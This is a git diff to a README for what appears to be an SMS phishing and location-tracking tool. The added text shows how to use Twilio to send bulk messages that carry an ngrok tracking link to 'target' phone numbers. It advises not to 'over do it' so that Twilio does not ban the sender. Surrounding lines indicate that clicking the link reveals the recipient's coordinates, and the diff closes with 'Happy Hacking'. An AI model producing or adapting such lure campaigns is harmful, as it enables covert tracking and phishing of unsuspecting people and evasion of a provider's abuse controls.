@@ -36,6 +36,41 @@ ngrok http 8080
 python send_sms.py
 ```
 
+*If you end up using Twilio, Keep in mind:*
+**You Can Send messages in bulk to many people, Just don't over do it or else Twilio will catch on and ban you.**
+`To Do It, Just copy and paste this part of the code and put it below the original code, and change the phone number to the number you desire.`
+```python
+message = client.messages.create(
+    body="Hi! Check this link: http://your-ngrok-url.ngrok.io/track",
+    from_='+1234567890',  # Your Twilio phone number
+    to='+14155552671'  # Target phone number
+)
+```
+
+***An Example would be:***
+```python
+from twilio.rest import Client
+
+# Twilio credentials
+account_sid = 'YOUR_ACCOUNT_SID'
+auth_token = 'YOUR_AUTH_TOKEN'
+
+client = Client(account_sid, auth_token)
+
+message = client.messages.create(
+    body="Hi! Check this link: http://your-ngrok-url.ngrok.io/track",
+    from_='+1234567890',  # Your Twilio phone number
+    to='+14155552671'  # Target phone number
+)
+message = client.messages.create(
+    body="Hi! Check this link: http://your-ngrok-url.ngrok.io/track",
+    from_='+1234567890',  # Your Twilio phone number
+    to='+14139239481'  # Target phone number
+)
+
+print(f"Message sent: {message.sid}")
+```
+
 ***What Happens:***
 ***1***. *The target receives the SMS with the link.*
 ***2***. *When they click the link:*
@@ -63,5 +98,5 @@ Longitude: -9.3515381
 ***Testing:***
 *Use ngrok for testing, but for production, deploy on a proper hosting service (e.g., AWS, Azure, etc.).*
 
-***Feel Free to modify the code to your liking ifywim.***
+***Feel Free to modify the code to your liking if ykwim.***
 **Happy Hacking ;)**
